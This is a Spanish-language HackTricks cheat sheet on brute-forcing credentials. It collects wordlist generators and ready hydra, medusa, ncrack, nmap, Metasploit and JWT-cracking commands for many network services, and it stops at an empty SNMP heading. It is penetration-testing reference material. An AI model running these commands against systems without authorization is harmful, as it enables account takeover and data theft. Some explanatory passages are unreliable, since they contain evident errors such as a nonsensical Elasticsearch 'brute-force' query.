# Fuerza Bruta - Hoja de trucos

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas de la comunidad más avanzadas del mundo.\
Obtenga acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparta sus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Credenciales predeterminadas

**Busque en Google** las credenciales predeterminadas de la tecnología que se está utilizando, o **pruebe estos enlaces**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Crea tus propios diccionarios**

Encuentre tanta información sobre el objetivo como pueda y genere un diccionario personalizado. Herramientas que pueden ayudar:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl es una herramienta que se utiliza para crear listas de palabras a partir de un sitio web o de un archivo de texto. Es muy útil para la realización de ataques de fuerza bruta, ya que permite crear listas de palabras personalizadas basadas en el contenido del sitio web objetivo.

Para utilizar Cewl, simplemente se debe ejecutar el comando `cewl` seguido de la URL del sitio web o del archivo de texto que se desea analizar. La herramienta buscará todas las palabras en el sitio web o archivo de texto y las agregará a una lista de palabras personalizada.

Una vez que se ha creado la lista de palabras personalizada, se puede utilizar en herramientas de fuerza bruta como Hydra o Medusa para intentar adivinar las contraseñas de los usuarios. También se puede utilizar para realizar ataques de phishing, ya que permite crear listas de palabras personalizadas basadas en el contenido de un sitio web de phishing.

Es importante tener en cuenta que el uso de Cewl para crear listas de palabras personalizadas puede ser ilegal si se utiliza para realizar ataques sin autorización. Por lo tanto, se debe utilizar con precaución y siempre con el permiso del propietario del sitio web o del archivo de texto.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Genera contraseñas basadas en tu conocimiento sobre la víctima (nombres, fechas...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wister es una herramienta generadora de listas de palabras que te permite suministrar un conjunto de palabras, dándote la posibilidad de crear múltiples variaciones a partir de las palabras dadas, creando una lista de palabras única e ideal para usar en relación a un objetivo específico.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____  
 \ \        / /_   _|/ ____|__   __|  ____|  __ \ 
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  / 
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \ 
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity    
      
Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Listas de palabras

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://google/fuzzing/tree/master/dictionaries**](https://google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilice [**Trickest**](https://trickest.io/) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas de la comunidad más avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Servicios

Ordenados alfabéticamente por nombre de servicio.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

El Protocolo de Conector de Java Avanzado (AJP) es un protocolo de red utilizado por los servidores web para comunicarse con los servidores de aplicaciones. A menudo se utiliza en entornos de servidor web de alta carga para mejorar el rendimiento y la escalabilidad.

Los atacantes pueden utilizar la técnica de fuerza bruta para intentar adivinar las credenciales de inicio de sesión de AJP. Esto se puede hacer utilizando herramientas como Hydra o Patator. También es posible buscar vulnerabilidades conocidas en el servidor AJP, como la exposición de información sensible o la ejecución remota de código.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
### Cassandra

Cassandra es una base de datos distribuida altamente escalable y tolerante a fallos. Es utilizada por muchas empresas para almacenar grandes cantidades de datos en múltiples servidores. Debido a su arquitectura distribuida, Cassandra es resistente a los fallos de hardware y software, lo que la hace muy confiable. Sin embargo, esto también la hace vulnerable a los ataques de fuerza bruta.

La forma más común de realizar un ataque de fuerza bruta en Cassandra es intentar adivinar la contraseña de un usuario con acceso a la base de datos. Esto se puede hacer utilizando herramientas como Hydra o Medusa, que intentan diferentes combinaciones de nombres de usuario y contraseñas hasta que encuentran una que funcione.

Para evitar un ataque de fuerza bruta en Cassandra, es importante utilizar contraseñas seguras y complejas, y limitar el número de intentos de inicio de sesión fallidos permitidos antes de bloquear la cuenta. También se pueden utilizar herramientas de monitoreo de seguridad para detectar y prevenir intentos de inicio de sesión malintencionados.
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
### CouchDB

CouchDB es una base de datos NoSQL que utiliza JSON para almacenar datos. Es muy popular en aplicaciones web y móviles debido a su capacidad para sincronizar datos entre dispositivos. 

#### Fuerza bruta en CouchDB

CouchDB tiene una API RESTful que permite a los usuarios realizar operaciones CRUD en la base de datos. Esto significa que es posible realizar ataques de fuerza bruta contra la API para intentar adivinar las credenciales de inicio de sesión de un usuario. 

Para realizar un ataque de fuerza bruta en CouchDB, se puede utilizar una herramienta como Hydra o Burp Suite. El objetivo es enviar solicitudes HTTP POST a la API de CouchDB con diferentes combinaciones de nombres de usuario y contraseñas hasta que se encuentre una combinación válida. 

Es importante tener en cuenta que CouchDB tiene una función de límite de velocidad incorporada que limita el número de solicitudes que se pueden enviar en un período de tiempo determinado. Por lo tanto, es posible que se necesite ajustar la velocidad del ataque para evitar que se bloquee la cuenta del usuario o se detecte el ataque.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Registro de Docker
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch es un motor de búsqueda y análisis de datos distribuido y de código abierto. Es utilizado por muchas empresas para indexar y buscar grandes cantidades de datos. Elasticsearch utiliza una API RESTful y JSON para interactuar con los datos. 

#### Fuerza bruta

La fuerza bruta en Elasticsearch se puede realizar utilizando la API RESTful. La API de Elasticsearch tiene una ruta llamada `_search` que se puede utilizar para buscar datos. La ruta `_search` acepta una consulta JSON que se utiliza para buscar datos. 

Para realizar un ataque de fuerza bruta en Elasticsearch, se puede enviar una consulta JSON que contenga una lista de contraseñas. La consulta debe estar estructurada de tal manera que intente cada contraseña en la lista hasta que se encuentre la correcta. 

Un ejemplo de consulta JSON para un ataque de fuerza bruta en Elasticsearch se muestra a continuación:

```
POST /index/_search
{
  "query": {
    "bool": {
      "should": [
        { "match": { "password": "password1" } },
        { "match": { "password": "password2" } },
        { "match": { "password": "password3" } }
      ]
    }
  }
}
```

En este ejemplo, la consulta intentará las contraseñas "password1", "password2" y "password3" en el campo "password" del índice "index". Si se encuentra la contraseña correcta, Elasticsearch devolverá los datos correspondientes.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

El Protocolo de Transferencia de Archivos (FTP, por sus siglas en inglés) es un protocolo de red utilizado para la transferencia de archivos de un host a otro a través de una red TCP basada en IP. FTP utiliza un modelo cliente-servidor para la transferencia de archivos y requiere autenticación para acceder a los archivos. Los ataques de fuerza bruta contra FTP implican intentar adivinar las credenciales de inicio de sesión de un usuario mediante la prueba de diferentes combinaciones de nombres de usuario y contraseñas.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### Fuerza Bruta Genérica HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Autenticación Básica HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - Enviar formulario mediante POST
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Para http**s** tienes que cambiar de "http-post-form" a "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla o (D)rupal o (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

El Protocolo de Acceso a Mensajes de Internet (IMAP) es un protocolo de correo electrónico utilizado para recibir correos electrónicos de un servidor de correo electrónico. IMAP permite a los usuarios acceder a sus correos electrónicos desde cualquier dispositivo y mantenerlos sincronizados. Los servidores de correo electrónico IMAP suelen tener medidas de seguridad para evitar ataques de fuerza bruta, como limitar el número de intentos de inicio de sesión y bloquear direcciones IP después de varios intentos fallidos. Sin embargo, si se encuentra una vulnerabilidad en el servidor, un atacante podría intentar un ataque de fuerza bruta para obtener acceso no autorizado a una cuenta de correo electrónico.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
### IRC

IRC (Internet Relay Chat) es un protocolo de comunicación en tiempo real utilizado principalmente para la comunicación en grupo. Los canales de IRC son salas de chat virtuales donde los usuarios pueden comunicarse entre sí. Los canales de IRC son muy populares en la comunidad de hacking y se utilizan a menudo para discutir temas relacionados con la seguridad informática. 

El brute force en IRC se puede realizar mediante el uso de herramientas como Hydra o Medusa. Estas herramientas pueden ser utilizadas para probar contraseñas en un servidor de IRC. También es posible realizar ataques de diccionario utilizando listas de contraseñas comunes. 

Es importante tener en cuenta que el brute force en IRC puede ser detectado fácilmente por los administradores del servidor. Por lo tanto, se recomienda utilizar técnicas de evasión, como el uso de proxies o VPNs, para ocultar la dirección IP del atacante.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI (Internet Small Computer System Interface) es un protocolo de red que permite a los dispositivos de almacenamiento de datos conectarse a través de una red IP. Esto permite que los dispositivos de almacenamiento se compartan entre múltiples servidores y aplicaciones. 

Los ataques de fuerza bruta contra iSCSI pueden ser utilizados para intentar adivinar las credenciales de autenticación de un dispositivo de almacenamiento iSCSI. Esto puede permitir a un atacante acceder a los datos almacenados en el dispositivo. 

Para llevar a cabo un ataque de fuerza bruta contra iSCSI, se puede utilizar una herramienta como `iscsi-brute`. Esta herramienta intentará adivinar las credenciales de autenticación utilizando una lista de posibles nombres de usuario y contraseñas. 

Es importante tener en cuenta que los ataques de fuerza bruta pueden ser detectados por los sistemas de seguridad, por lo que es importante utilizar técnicas de evasión para evitar la detección.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT (JSON Web Token) es un estándar abierto (RFC 7519) que define un formato compacto y autónomo para transmitir información de forma segura entre partes como un objeto JSON. Esta información puede ser verificada y confiada porque está firmada digitalmente. Los JWT se utilizan a menudo para la autenticación y la autorización en aplicaciones web y móviles. 

Un JWT consta de tres partes separadas por puntos: el encabezado, la carga útil y la firma. El encabezado especifica el tipo de token y el algoritmo de firma utilizado. La carga útil contiene la información que se va a transmitir, como el nombre de usuario y los permisos de acceso. La firma se utiliza para verificar la integridad del token y garantizar que no ha sido manipulado.

Los JWT son vulnerables a los ataques de fuerza bruta si se utilizan algoritmos de firma débiles o si las claves secretas son demasiado cortas o predecibles. Es importante utilizar algoritmos de firma fuertes y claves secretas aleatorias y seguras para proteger los JWT. Además, es recomendable utilizar medidas de seguridad adicionales, como la limitación de intentos de inicio de sesión y la detección de patrones de comportamiento sospechosos.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Protocolo Ligero de Acceso a Directorios) es un protocolo de red utilizado para acceder y mantener información de directorios distribuidos. Es comúnmente utilizado para autenticación y autorización en sistemas de red.

#### Ataque de fuerza bruta

El ataque de fuerza bruta en LDAP implica intentar adivinar las credenciales de un usuario mediante la prueba de diferentes combinaciones de nombres de usuario y contraseñas. Este ataque puede ser automatizado utilizando herramientas como Hydra o Patator.

Para llevar a cabo un ataque de fuerza bruta en LDAP, primero se necesita una lista de posibles nombres de usuario y contraseñas. Estas listas pueden ser creadas utilizando herramientas como CeWL o Crunch.

Una vez que se tiene la lista de posibles credenciales, se puede utilizar una herramienta de fuerza bruta para probar cada combinación hasta que se encuentre una que funcione. Es importante tener en cuenta que algunos servidores LDAP pueden tener medidas de seguridad en su lugar para prevenir ataques de fuerza bruta, como la limitación del número de intentos de inicio de sesión permitidos antes de bloquear la cuenta.
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT (Message Queuing Telemetry Transport) es un protocolo de mensajería ligero diseñado para dispositivos IoT (Internet de las cosas) con ancho de banda limitado y conexiones inestables. MQTT utiliza un modelo de publicación/suscripción en el que los clientes se suscriben a temas (topics) y reciben mensajes publicados en esos temas. 

Los ataques de fuerza bruta contra MQTT pueden ser utilizados para obtener credenciales de acceso a dispositivos IoT y a sistemas de control industrial. Los atacantes pueden utilizar herramientas como Mosquito, que es un servidor MQTT de código abierto, para realizar ataques de fuerza bruta contra dispositivos IoT y sistemas de control industrial que utilizan MQTT. 

Para protegerse contra los ataques de fuerza bruta en MQTT, se recomienda utilizar contraseñas fuertes y cambiarlas regularmente. También se recomienda utilizar certificados SSL/TLS para cifrar las comunicaciones MQTT y limitar el acceso a los dispositivos IoT y sistemas de control industrial a través de firewalls y otros mecanismos de seguridad.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### Mongo

Mongo es una base de datos NoSQL muy popular que se utiliza en muchos proyectos. A menudo, los desarrolladores no configuran adecuadamente la seguridad de Mongo, lo que puede permitir a los atacantes acceder a la base de datos y robar información confidencial. Una técnica común utilizada para atacar Mongo es la fuerza bruta, que implica probar diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar la correcta. Para evitar esto, es importante asegurarse de que se han tomado medidas adecuadas para proteger la base de datos, como la configuración de contraseñas seguras y la limitación del acceso a la base de datos solo a usuarios autorizados.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQL es un sistema de gestión de bases de datos relacional de código abierto. Es ampliamente utilizado en aplicaciones web y es compatible con muchos lenguajes de programación. MySQL utiliza una combinación de nombre de usuario y contraseña para autenticar a los usuarios y proporciona una variedad de herramientas de seguridad para proteger los datos almacenados en la base de datos. 

#### Fuerza bruta

La fuerza bruta es una técnica común utilizada para obtener acceso no autorizado a una base de datos MySQL. Consiste en probar todas las combinaciones posibles de nombres de usuario y contraseñas hasta que se encuentra una que funcione. Los atacantes pueden utilizar herramientas automatizadas para realizar ataques de fuerza bruta en una base de datos MySQL. 

Para protegerse contra los ataques de fuerza bruta, se recomienda utilizar contraseñas seguras y complejas que contengan una combinación de letras, números y caracteres especiales. También se recomienda limitar el número de intentos de inicio de sesión fallidos antes de bloquear temporalmente la cuenta del usuario. Además, se pueden utilizar herramientas de detección de intrusos para detectar y bloquear automáticamente los intentos de inicio de sesión malintencionados.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
### OracleSQL

OracleSQL es un lenguaje de programación utilizado para administrar y manipular bases de datos Oracle. Es comúnmente utilizado en aplicaciones empresariales y es una herramienta importante para los hackers que buscan acceder a información confidencial almacenada en bases de datos Oracle. Los ataques de fuerza bruta son comunes en OracleSQL y pueden ser utilizados para descubrir contraseñas débiles o vulnerabilidades en la seguridad de la base de datos. Es importante que los administradores de bases de datos tomen medidas para proteger sus sistemas contra estos ataques, como la implementación de políticas de contraseñas fuertes y la limitación del acceso a la base de datos solo a usuarios autorizados.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
Para utilizar **oracle\_login** con **patator** necesitas **instalar**:
```bash
pip3 install cx_Oracle --upgrade
```
Fuerza bruta de hash OracleSQL offline (versiones 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2 y 11.2.0.3):
```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP (Post Office Protocol) es un protocolo utilizado para la recuperación de correo electrónico desde un servidor remoto. POP3 es la versión más utilizada actualmente. Los ataques de fuerza bruta contra servidores POP3 son comunes y pueden ser muy efectivos si se utilizan contraseñas débiles.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL es un sistema de gestión de bases de datos relacional de código abierto y gratuito. Es muy utilizado en aplicaciones web y móviles, y es compatible con una amplia variedad de lenguajes de programación. PostgreSQL es conocido por su seguridad y estabilidad, y es una opción popular para aplicaciones empresariales críticas. 

#### Fuerza bruta en PostgreSQL

La fuerza bruta en PostgreSQL se puede realizar mediante ataques de diccionario o mediante ataques de fuerza bruta puros. Los ataques de diccionario implican el uso de una lista de palabras comunes para adivinar contraseñas, mientras que los ataques de fuerza bruta puros implican probar todas las combinaciones posibles de caracteres hasta encontrar la contraseña correcta.

Para evitar ataques de fuerza bruta en PostgreSQL, se pueden tomar medidas como limitar el número de intentos de inicio de sesión, utilizar contraseñas seguras y utilizar autenticación de dos factores. También es importante mantener PostgreSQL actualizado con las últimas correcciones de seguridad.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

Puedes descargar el paquete `.deb` para instalar desde [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

El Protocolo de Escritorio Remoto (RDP, por sus siglas en inglés) es un protocolo de red desarrollado por Microsoft que permite a los usuarios conectarse a un equipo remoto y utilizarlo como si estuvieran sentados frente a él. Los ataques de fuerza bruta contra RDP son comunes y pueden ser muy efectivos si se utilizan contraseñas débiles. Es importante asegurarse de que las contraseñas utilizadas para las conexiones RDP sean lo suficientemente fuertes y se cambien regularmente para evitar ataques exitosos.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
### Redis

Redis es una base de datos en memoria que se utiliza a menudo como caché y almacén de datos. Es muy popular en aplicaciones web y móviles debido a su alta velocidad y escalabilidad. Sin embargo, Redis también es vulnerable a ataques de fuerza bruta si no se configura correctamente.

Hay varias herramientas de fuerza bruta disponibles para Redis, como `redis-cli`, `redis-brute`, `redis-rdb-crack` y `redis-password-cracker`. Estas herramientas pueden probar contraseñas comunes o diccionarios de contraseñas contra una instancia de Redis para intentar obtener acceso no autorizado.

Para protegerse contra los ataques de fuerza bruta en Redis, es importante seguir las mejores prácticas de seguridad, como cambiar la contraseña predeterminada, limitar el acceso a la instancia de Redis y utilizar una lista blanca de direcciones IP autorizadas. También se recomienda utilizar una herramienta de monitoreo de seguridad para detectar y prevenir los ataques de fuerza bruta.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec es un protocolo de red que permite a un usuario ejecutar comandos en un sistema remoto. Es similar a Telnet, pero se utiliza principalmente para ejecutar comandos en sistemas Unix. Rexec utiliza el puerto 512 y no proporciona cifrado, lo que lo hace vulnerable a ataques de sniffing. Los atacantes pueden utilizar herramientas de fuerza bruta para adivinar las credenciales de inicio de sesión y obtener acceso no autorizado al sistema remoto. Es importante utilizar contraseñas seguras y autenticación de dos factores para protegerse contra ataques de fuerza bruta.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

El protocolo Rlogin es un protocolo de red que proporciona acceso remoto a un shell de Unix. Es similar a Telnet, pero no proporciona cifrado de datos, lo que lo hace menos seguro. El protocolo Rlogin utiliza el puerto 513/tcp. 

El ataque de fuerza bruta contra Rlogin implica intentar adivinar las credenciales de inicio de sesión de un usuario mediante la prueba de diferentes combinaciones de nombres de usuario y contraseñas. Esto se puede hacer utilizando herramientas como Hydra o Medusa. Es importante tener en cuenta que este ataque es ilegal y puede tener graves consecuencias legales.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) es un protocolo de red que permite a los usuarios ejecutar comandos en un servidor remoto. Es similar a SSH, pero menos seguro ya que no utiliza cifrado para proteger la comunicación. Rsh se utiliza a menudo en entornos de red antiguos y no se recomienda su uso en la actualidad debido a sus vulnerabilidades de seguridad. 

La técnica de fuerza bruta se puede utilizar para intentar adivinar las credenciales de inicio de sesión de Rsh. Esto se puede hacer utilizando herramientas como Hydra o Medusa. Sin embargo, dado que Rsh no utiliza cifrado, es posible que un atacante pueda interceptar las credenciales de inicio de sesión si se envían sin cifrar a través de la red. Por lo tanto, se recomienda encarecidamente no utilizar Rsh y, en su lugar, utilizar protocolos más seguros como SSH.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync es una herramienta de sincronización de archivos que se utiliza comúnmente en sistemas Unix. Es muy útil para sincronizar grandes cantidades de datos entre diferentes sistemas. Rsync utiliza el protocolo RSH (Remote Shell) para conectarse a sistemas remotos y transferir archivos. RSH es un protocolo inseguro que transmite información de autenticación en texto claro, lo que lo hace vulnerable a ataques de sniffing. Por lo tanto, es importante asegurarse de que RSH no esté habilitado en los sistemas que se están utilizando.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

El Protocolo de Transmisión en Tiempo Real (RTSP, por sus siglas en inglés) es un protocolo de red utilizado para controlar la transmisión de medios en tiempo real, como audio y video. Es comúnmente utilizado en sistemas de vigilancia y cámaras IP para transmitir video en vivo. Los ataques de fuerza bruta contra servidores RTSP pueden ser utilizados para obtener acceso no autorizado a los sistemas de vigilancia y cámaras IP.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

